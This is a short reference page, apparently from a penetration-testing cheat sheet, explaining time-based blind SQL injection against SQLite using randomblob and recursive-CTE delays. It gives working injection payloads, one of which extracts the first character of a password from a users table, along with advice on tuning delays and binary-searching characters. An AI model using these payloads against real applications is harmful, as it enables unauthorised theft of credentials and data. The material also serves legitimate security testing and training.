---
title: "Time-based blind SQL injection in SQLite"
description: "Inferring SQLite data from conditional delays built with heavy expressions such as randomblob, since SQLite has no SLEEP function."
keywords:
  - time based blind
  - randomblob
  - no SLEEP
  - heavy query
  - SQLite timing
---

# Time-based

SQLite has no `SLEEP` or `pg_sleep`, so a delay is created by making the database do expensive work only when a condition is true. The usual device is `randomblob(n)`, which allocates `n` bytes of random data; wrapping a large blob in `hex()` and a comparison forces measurable CPU time.

Gate the heavy expression with `CASE` so it runs only on a true test:

```sql
' AND 1=(CASE WHEN (unicode(substr((SELECT password FROM users LIMIT 1),1,1))>77) THEN (SELECT 1 WHERE like('A',upper(hex(randomblob(100000000))))) ELSE 1 END)-- 
```

When the test is true, SQLite hashes and compares a ~100 MB random blob (a second or more of CPU); when false, the `ELSE` returns immediately. Tune the blob size to the server so a true test adds a clear, repeatable delay. A large recursive CTE is an alternative heavy expression where `randomblob` is filtered:

```sql
' AND 1=(CASE WHEN (<cond>) THEN (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT 5000000) SELECT count(*) FROM c) ELSE 1 END)-- 
```

Binary-search each character on the delay exactly as in boolean extraction. Because the delay is CPU-bound rather than a fixed sleep, it is noisier than `WAITFOR` or `pg_sleep`, so keep the work large enough for a distinct delay and repeat a positive hit before trusting it. Each probe loads a CPU core, so use the smallest size that still reads clearly.

## References

- SQLite Documentation: randomblob, hex, recursive common table expressions
- PortSwigger Web Security Academy: Blind SQL injection
